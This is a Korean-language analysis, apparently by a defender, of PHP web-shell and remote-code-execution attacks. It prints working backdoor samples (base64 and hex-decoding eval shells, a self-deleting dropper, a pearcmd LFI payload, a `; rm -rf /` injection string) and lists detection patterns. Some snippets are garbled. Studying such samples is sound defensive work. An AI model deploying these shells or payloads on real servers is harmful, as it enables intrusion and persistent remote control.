## 🥞 **PHP Code Injection / Remote Code Execution** 예제

### A. 업로드 → 웹루트에 `.php`로 저장 → Stored WebShell 

취약한 `up.cgi`가 `uploads/`에 `$_FILES['file']['name']` 그대로 저장하고 `uploads/`가 웹에서 PHP를 실행하도록 설정되어 있으면 RCE.

취약점 흐름:

* POST로 `shell.php`(내용: `<?php ... ?>`) 업로드 → `/uploads/shell.php` 생성 → `GET /uploads/shell.php` 요청 → 서버가 PHP 해석 → 공격자 명령 실행.

### B. 파일명 경로 조작 → 디렉토리 트래버설

업로드 핸들러가 파일명을 `../../www/some.php`처럼 조작해서 의도한 위치(예: 웹루트)로 쓰도록 허용하면 RCE.

### C. 쉘 명령 인젝션

업로드 핸들러가 `system("mv $tmp $dest");` 처럼 외부 입력($dest)에 검증 없이 넣으면 `; rm -rf /` 같은 인젝션 가능.

### D. 로그 포이즈닝 + LFI

* 공격자가 로그(예: access.log)에 `<?php ... ?>`를 주입하고, 어딘가 LFI 취약점이 있으면 `include('/var/log/apache2/access.log')`로 인해 코드 실행 가능.


### E. 그 외 

* **흔한 주입 경로**

  * 파일 업로드 취약점(확장자/확장자 검증 실패)
  * LFI(Local File Inclusion) 취약점을 통한 로그/업로드 파일 포함
  * 취약한 플러그인/테마(특히 워드프레스)
  * 미스컨피규어된 eval/인클루드 사용 코드

---

## 🔫 패턴(웹셸·RCE 증거)
 
* `eval(base64_decode(...))`, `preg_replace(.../e...)`, `create_function`, `assert()` 등으로 **인코딩된 명령/코드 실행**
* `system()`, `exec()`, `shell_exec()`, `passthru()`, `proc_open()` 등으로 **OS 명령 실행**
* `file_put_contents`, `fopen`, `move_uploaded_file` 등으로 **파일 쓰기·업로드(영구 웹셸 설치)**
* `curl`, `fsockopen` 등으로 **C2(명령서버)와 통신**
* `gzuncompress`, `str_rot13` 등으로 **난독화/압축 해제** 후 실행

---

## 📎 예제 1. 웹루트 php Stored WebShell 기반 웹 백도어 및 원격 쉘 공격

#### (1) eval(base64_decode($_POST[])
.php로 끝나는 경로에서, `eval(base64_decode($_POST[z0]))` 형태로 외부에서 전송한(base64로 인코딩된) 데이터를 디코딩 → `eval()`로 실행하겠다는 코드. 


```php
@eval(base64_decode($_POST['z0']));
```

* 동작: 공격자는 HTTP POST로 `z0`라는 매개변수에 **base64로 인코딩한 PHP 코드**를 보내고, 서버측은 이를 디코딩해서 `eval()`로 실행합니다.
  * 예: POST body `z0=PD9waHAgc3lzdGVtKCd1bmFtZSAtYScpOyA/Pg==` (base64 디코딩하면 `<?php system('uname -a'); ?>`) → 서버가 이를 실행하면 `uname -a` 출력이 반환됩니다.
* `@`는 에러 억제 연산자(경고/에러 감추기) — 탐지 어렵게 하려는 시도.

<br>

#### (2) LFI→RCE(파일 쓰기 또는 애플리케이션/유틸리티 오용) 익스플로잇 패턴 
`pearcmd` 같은 로컬 유틸리티의 기능(파일 생성/설정 작성 등)을 오용하는 전형적 공격입니다.

```
/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php
```


* `lang=` 같은 파라미터를 통해 **경로(파일)를 포함(include)** 하도록 처리되는 취약점(LFI)을 노립니다(예: `include($_GET['lang'])`).
* `../../.../usr/local/lib/php/pearcmd` 같은 경로는 시스템에 설치된 PEAR의 `pearcmd` 실행 스크립트(또는 유사 파일)를 가리킵니다.
* 이어서 `&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php` 같은 추가 문자열은 pear 명령형 인터페이스를 통해 **파일 생성(config-create)** 을 호출해 `<?echo(md5("hi"));?>` 같은 PHP 코드를 **/tmp/index1.php** 에 쓰도록 시도하는 패턴입니다.
* 결과적으로 공격자는 LFI를 통해 시스템의 다른 기능(pearcmd 등)을 포함/호출하여 **원격에서 임의 PHP 파일을 생성**(웹셸)하고, 그 파일에 접근해 임의 코드 실행(RCE)을 달성하려고 합니다.

* 만들어진 `/tmp/index1.php`에 PHP 코드가 들어가면(예: `<?echo(md5("hi"));?>`) 웹에서 해당 파일을 호출하여 코드 실행(원격 명령/웹셸) 가능.
* 공격자는 단순한 `md5("hi")` 테스트를 사용해 성공 여부 확인 후 더 위험한 코드(`system()`, `passthru()`, webshell 등)로 바꿀 수 있음.


---

## 🧩 예제 2.  PHP 명령을 원격에서 실행할 수 있는 백도어 웹셸 설치

이 코드는 서버에 **`bbat.php`**라는 파일을 만들어서,
POST로 전달된 매개변수(`cc`) 안의 **PHP 코드(또는 HEX 인코딩된 명령)** 를 **`eval()`** 로 실행하게 만듭니다.

```php
@eval(
    ,
    echo 'Gif89aMini<?php
        class _ {
            static public $phpcms = null;

            function __construct($l = "error") {
                self::$phpcms = $l;
                @eval(null.null.self::$phpcms);
            }
        }

        function hexToStr($hex) {
            $str = "";
            for ($i = 0; $i < strlen($hex)-1; $i += 2)
                $str .= chr(hexdec($hex[$i].$hex[$i + 1]));
            return $str;
        }

        $error = null . hexToStr(@$_POST["cc"]);
        $d = new _($error);
    ?>'
    > bbat.php,
    "){self::$phpcms = $l; @eval(null.null.self::$phpcms)"
|
```

* `echo 'Gif89aMini<?php ... ?>' > bbat.php`
→ 새 PHP 파일(`bbat.php`)을 생성합니다. `Gif89a`라는 문자열은 GIF 헤더처럼 위장하려는 흔적입니다 (안티바이러스 탐지 회피용 트릭).
즉, 이 한 줄로 **웹셸 파일**이 만들어집니다.

* `@eval(...)` 구문은 **첫 단계의 주입용 코드**
공격자가 이미 어딘가 취약한 eval 지점(예: `eval($_POST[x])`)을 찾은 상황에서
그 안에 위 코드를 집어넣어 **자체 웹셸 생성 코드**를 실행시키는 형태입니다.


### 실제 작동 로직

1. 공격자는 `/bbat.php`로 POST 요청을 보냅니다.

   ```bash
   POST /bbat.php
   cc=706870696e666f28293b  # (hex for "phpinfo();")
   ```

2. `hexToStr()` 함수가 이 HEX 문자열을 디코드 → `"phpinfo();"`

3. `$error` 변수에 `"phpinfo();"`가 들어감.

4. `new _($error)` → 생성자에서 `eval(null.null.self::$phpcms);` 실행
   → 즉, **`eval('phpinfo();')` 실행.**

이 구조 때문에 공격자는 **`cc`** 파라미터에 HEX 인코딩된 PHP 코드를 전송해 서버에서 아무 명령이나 실행할 수 있습니다.
예: 파일 업로드, 리버스쉘, DB 덤프 등.


---
## 🔍 예제 3.  자기삭제형 지속성 웹셸 생성 공격


```php
<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);

$file = '.config2.php';
$code = '<?php if(md5($_GET["pass"]) == "<some_md5_value>") { eval($_POST["cmd"]); } ?>';
file_put_contents($file, $code);
?>
```

.php` 는
실제로 **공격 대상**의 업로드 엔드포인트입니다 — 즉, 이 악성 PHP 코드를 업로드해서 실행하려는 시도입니다.)

---

## ⚙️ 2. 이 코드가 하는 일 (단계별 설명)

1. **`ignore_user_abort(true)`**

   * 사용자가 연결을 끊어도(예: HTTP 요청 중단) 스크립트 실행을 계속함.
     → 공격자가 세션을 끊어도 백엔드에서 끝까지 실행되어 파일 생성 가능.

2. **`set_time_limit(0)`**

   * 실행 시간 제한 해제 → 무한 실행 가능.
     → PHP의 max_execution_time 제한 회피.

3. **`unlink(__FILE__)`**

   * 현재 실행 중인 악성 파일(예: 업로드된 공격 스크립트)을 **즉시 삭제.**
   * 흔적 제거 목적 (로그는 남지만 파일이 사라져 탐지 어렵게 함).

4. **`$file = '.config2.php';`**

   * 새 웹셸 파일명을 `.config2.php` 로 지정 (보통 숨김용 이름 — 점(.)으로 시작).

5. **`$code = '<?php if(md5($_GET["pass"]) == "...") { eval($_POST["cmd"]); } ?>';`**

   * 새로운 백도어 웹셸 코드 정의.

   * 이 파일(`.config2.php`)은 다음과 같이 작동함:

     ```php
     <?php
     if (md5($_GET['pass']) == 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx') {
         eval($_POST['cmd']);
     }
     ?>
     ```

   * 즉, 공격자는 `/Common/ckeditor/plugins/multiimg/dialogs/.config2.php?pass=<비밀번호>` 로 접근해
     `cmd` POST 파라미터에 임의 PHP 코드를 보내면,
     서버에서 그대로 **`eval()` → 원격 코드 실행(RCE)** 이 가능합니다.

6. **`file_put_contents($file, $code);`**

   * 위 `$code` 내용을 `.config2.php` 파일로 저장함 → **웹셸 영구 설치.**

7. **`unlink(__FILE__)`**

   * 실행이 끝나면 **자신(업로드된 초기 스크립트)** 는 삭제 → 탐지 회피.

---

## 🧠 3. 결과적으로 하는 일

| 단계  | 설명                                                  |
| --- | --------------------------------------------------- |
| 1️⃣ | 공격자는 업로드 취약점을 통해 이 PHP 코드를 업로드                      |
| 2️⃣ | 서버에서 이 코드가 실행됨                                      |
| 3️⃣ | `.config2.php` 웹셸이 조용히 생성됨                          |
| 4️⃣ | 원래 업로드된 악성 파일은 `unlink()`로 삭제 (흔적 제거)               |
| 5️⃣ | 공격자는 이후 `.config2.php?pass=<암호>` 로 접속하여 원격 명령 실행 가능 |

---

## ⚠️ 4. 공격 의도

이건 “**스텔스 웹셸 설치 + 자기삭제**” 공격이에요.
공격자는 단 한 번만 업로드 성공해도,

* 새로운 웹셸을 만들어두고
* 자신이 쓴 초기 페이로드 파일은 삭제해
  보안 솔루션 탐지를 어렵게 만듭니다.

즉, **CVE-2021-33841** 같은 CKEditor 이미지 업로드 취약점을 노린 **웹셸 주입 공격** 패턴입니다.

---

## 🔥 5. 확실한 공격 증거

* `/Common/ckeditor/plugins/multiimg/dialogs/` 디렉터리에 `.config2.php` 또는 유사 이름 PHP 파일이 생성됨.
* `.config2.php` 내부에 `if(md5($_GET['pass'])==...) eval($_POST['cmd']);` 같은 코드 존재.
* 원래 업로드된 악성 파일은 삭제되어 없음(`unlink(__FILE__)` 미작동 시).
* 서버 로그에서 같은 시간대에

  ```
  POST /Common/ckeditor/plugins/multiimg/dialogs/image_upload.php
  ```

  요청이 있음.

---

## 🔒 예제 4 : 에러·출력 숨기기 + 실행시간 연장



  ```php
  <?php $xd=&$xf; error_reporting(E_ERROR); @ini_set('display_errors','Off'); @ini_set('max_execution_time',20000);
  ```

  또는

  ```php
  <?php $xd = &$xf . ""; error_reporting(E_ERROR); @ini_set('display_errors','Off'); @ini_set('max_execution_time',20000);
  ```


* `error_reporting(E_ERROR);`

  * 표시되는 에러 레벨을 `E_ERROR`(치명적 오류)만 보이게 제한합니다. 경고/주의/공지(notice) 등은 숨김 → 탐지 어려움.

* `@ini_set('display_errors','Off');`

  * `@`는 그 뒤 함수 호출로부터 발생하는 경고/알림을 억제합니다. `ini_set('display_errors','Off')`로 화면에 에러를 출력하지 않게 설정.
  * 결합하면 공격자가 실행 중 발생하는 경고/notice/경로 오류 등 로그/출력을 통해 드러나는 단서를 숨기려는 의도.

* `@ini_set('max_execution_time',20000);`

  * 스크립트 최대 실행 시간을 늘려(여기선 20,000초) 장시간 작업(무한 루프, 연산, 대량 처리, 외부 접속 대기 등)을 가능하게 함.
  * 공격자가 DoS, 백도어 유지, 암호화 채굴, 대량 스캔 등을 실행하려는 경우 유용.

* `$xd\=&$xf.\"\";` (의도 추정)

  * 실제 원문이 `$xd=&$xf;` 또는 `$xd = &$xf . "";` 등이라면:

    * `&`는 **참조(reference)** 연산자. 변수 참조를 만들려는 시도일 수 있음(백도어 코드에서 전역 변수 참조로 편리하게 접근하려는 기법).
    * `.""` 처럼 문자열을 이어붙이는 건 값 강제 변환/빈 문자열 추가로 특정 구문을 우회하려는 트릭일 수 있음.
  * 요약하면: **환경 설정을 은닉하고 실행 시간을 늘려 악성 행위를 오래, 조용히 수행하려는 의도**로 보입니다.

---

